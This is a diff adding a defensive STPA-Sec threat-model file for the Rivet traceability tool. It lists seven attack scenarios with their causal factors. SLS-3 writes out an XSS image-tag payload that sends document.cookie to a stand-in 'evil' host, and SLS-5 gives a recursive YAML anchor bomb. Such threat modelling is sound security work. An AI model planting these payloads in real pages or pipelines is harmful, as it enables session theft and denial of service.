@@ -1,0 +1,214 @@
+# =============================================================================
+# STPA-Sec Step 4 — Security Loss Scenarios
+# =============================================================================
+#
+# Security loss scenarios describe causal pathways — specifically how an
+# adversary could trigger a sec-uca or directly interact with the control
+# path or controlled process to reach a security hazard.
+#
+# Each scenario answers:
+#   (a) Why does the sec-uca occur? (adversarial control-algorithm causation)
+#   (b) How could the adversary tamper with feedback/information?
+#   (c) How could the adversary tamper with the control path?
+#   (d) How could the adversary interact with the controlled process?
+#
+# Reference: STPA Handbook, §2.5 + security extension
+# =============================================================================
+
+artifacts:
+  # ── Supply-chain artifact injection ─────────────────────────────────────
+
+  - id: SLS-1
+    type: sec-scenario
+    title: Git remote compromise — adversary replaces safety artifact files
+    status: approved
+    description: >
+      The adversary gains write access to the git remote hosting Rivet's
+      artifact repository.  They replace safety/stpa/hazards.yaml with a
+      version that removes H-3 (incorrect coverage metrics) and adds a
+      false system-constraint asserting coverage is complete.  On next
+      'rivet validate', Rivet loads the adversary-controlled artifacts,
+      the removed hazard causes no missing-constraint warning, and
+      'rivet stats' shows 100% coverage.  Engineers and auditors accept
+      the falsified report.
+    links:
+      - type: caused-by-sec-uca
+        target: SUCA-CLI-1
+      - type: leads-to-sec-hazard
+        target: SH-1
+      - type: leads-to-sec-hazard
+        target: SH-2
+    fields:
+      scenario-type: adversarial-control-algorithm
+      attack-vector: network
+      attacker-type: external-network
+      cia-impact: [integrity]
+      causal-factors:
+        - Git remote credentials stolen via phishing or leaked CI token
+        - No branch protection or required review on safety/ directory
+        - Rivet does not verify artifact store against last signed commit
+
+  - id: SLS-2
+    type: sec-scenario
+    title: OSLC MITM — adversary injects requirements via intercepted sync
+    status: approved
+    description: >
+      During 'rivet sync', an adjacent-network adversary intercepts the
+      TLS handshake between Rivet and the OSLC server.  TLS certificate
+      validation is disabled (tls-verify: false in rivet.yaml, a common
+      development shortcut).  The adversary presents their own certificate,
+      terminates the Rivet connection, and proxies modified artifact data
+      to the legitimate OSLC server.  Injected requirements claim incorrect
+      coverage relationships, inflating the coverage matrix.
+    links:
+      - type: caused-by-sec-uca
+        target: SUCA-OSLC-2
+      - type: leads-to-sec-hazard
+        target: SH-1
+      - type: leads-to-sec-hazard
+        target: SH-5
+    fields:
+      scenario-type: adversarial-feedback-injection
+      attack-vector: adjacent
+      attacker-type: external-network
+      cia-impact: [integrity, confidentiality]
+      causal-factors:
+        - tls-verify disabled for development and not re-enabled for production
+        - No artifact signature scheme to detect OSLC-injected content
+        - Adjacent network adversary (e.g., corporate LAN or CI network segment)
+
+  - id: SLS-3
+    type: sec-scenario
+    title: XSS via crafted artifact description in dashboard
+    status: approved
+    description: >
+      An insider commits a YAML artifact with the description:
+        "Verified by <img src=x onerror='fetch(\"//evil/x?c=\"+document.cookie)'>"
+      Rivet's dashboard renders the description without HTML escaping.
+      Any safety engineer who navigates to that artifact in their browser
+      executes the attacker's JavaScript, leaking their session context.
+      In a single-page-app context, the attacker can also read other
+      artifacts rendered on the same page.
+    links:
+      - type: caused-by-sec-uca
+        target: SUCA-DASH-2
+      - type: leads-to-sec-hazard
+        target: SH-4
+    fields:
+      scenario-type: adversarial-control-algorithm
+      attack-vector: local
+      attacker-type: insider
+      cia-impact: [confidentiality, integrity]
+      causal-factors:
+        - Artifact YAML fields included in HTML without escaping
+        - No Content-Security-Policy header restricting inline script execution
+        - Insider has write access to artifact YAML files
+
+  - id: SLS-4
+    type: sec-scenario
+    title: XSS via crafted artifact in HTML export served to reviewers
+    status: approved
+    description: >
+      An attacker (insider or supply-chain) commits a YAML artifact with a
+      script injection payload.  A project manager runs 'rivet export' to
+      produce a standalone HTML report for external review.  The HTML export
+      includes the unescaped payload; any reviewer who opens the file in a
+      browser executes the attacker's script.  Since HTML exports are often
+      sent by email or hosted on shared drives, the attack surface is broader
+      than the dashboard.
+    links:
+      - type: caused-by-sec-uca
+        target: SUCA-CLI-2
+      - type: leads-to-sec-hazard
+        target: SH-4
+    fields:
+      scenario-type: adversarial-control-path
+      attack-vector: local
+      attacker-type: insider
+      cia-impact: [confidentiality]
+      causal-factors:
+        - HTML export pipeline uses same rendering code as dashboard without additional escaping
+        - Export files distributed outside the controlled repository environment
+
+  - id: SLS-5
+    type: sec-scenario
+    title: YAML bomb in CI — supply-chain attacker causes pipeline DoS
+    status: approved
+    description: >
+      A supply-chain attacker opens a pull request that adds a crafted
+      YAML file to the artifacts/ directory:
+        deeply_nested: &a [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
+      The CI pipeline runs 'rivet validate' on every PR.  YAML parsing
+      expands the anchor recursively, consuming all available memory and
+      causing the CI runner to OOM-kill the rivet process (or timeout).
+      The pipeline is blocked for the duration of the attacker's PR.
+      If the attacker submits multiple PRs simultaneously, all CI capacity
+      is consumed.
+    links:
+      - type: caused-by-sec-uca
+        target: SUCA-CORE-1
+      - type: leads-to-sec-hazard
+        target: SH-6
+    fields:
+      scenario-type: adversarial-process-interaction
+      attack-vector: network
+      attacker-type: supply-chain
+      cia-impact: [availability]
+      causal-factors:
+        - serde_yaml (pre-0.9) follows YAML 1.1 aliases without recursion guard
+        - No maximum document size or node count limit in parsing pipeline
+        - CI allows external contributors to trigger the validate workflow on PRs
+
+  - id: SLS-6
+    type: sec-scenario
+    title: rivet.yaml OSLC URL hijack — insider redirects sync to exfiltration endpoint
+    status: approved
+    description: >
+      An insider with repository write access modifies rivet.yaml to change
+      the OSLC server URL from the legitimate Polarion host to an attacker-
+      controlled HTTPS server.  On next scheduled 'rivet sync', Rivet
+      authenticates to the adversary's server (using stored credentials from
+      environment variables), sends the full artifact payload, and accepts
+      the adversary's crafted response artifacts.  The legitimate OSLC server
+      is not contacted.  The insider can exfiltrate the entire artifact
+      database in a single sync operation.
+    links:
+      - type: caused-by-sec-uca
+        target: SUCA-OSLC-1
+      - type: leads-to-sec-hazard
+        target: SH-5
+    fields:
+      scenario-type: adversarial-control-algorithm
+      attack-vector: local
+      attacker-type: insider
+      cia-impact: [confidentiality, integrity]
+      causal-factors:
+        - No OSLC server URL allowlist configured or enforced
+        - Sync credentials (env vars) are sent to the URL in rivet.yaml without URL verification
+        - No review requirement on changes to rivet.yaml sync configuration
+
+  - id: SLS-7
+    type: sec-scenario
+    title: Unauthenticated dashboard on CI runner exposes artifacts to internet
+    status: approved
+    description: >
+      A developer adds 'rivet serve' to a CI job for preview purposes.
+      The CI runner has a public IP and no firewall rule restricts port 3000.
+      The default bind address is 0.0.0.0 (or the developer passes
+      '--bind 0.0.0.0').  An external attacker discovers the port via
+      shodan or port scanner, connects, and downloads all artifacts via
+      the /artifacts and /documents endpoints without any authentication.
+    links:
+      - type: caused-by-sec-uca
+        target: SUCA-DASH-1
+      - type: leads-to-sec-hazard
+        target: SH-3
+    fields:
+      scenario-type: adversarial-control-path
+      attack-vector: network
+      attacker-type: external-network
+      cia-impact: [confidentiality]
+      causal-factors:
+        - Default bind address is network-accessible (0.0.0.0)
+        - No authentication required for any dashboard endpoint
+        - CI runner has public IP without egress/ingress filtering
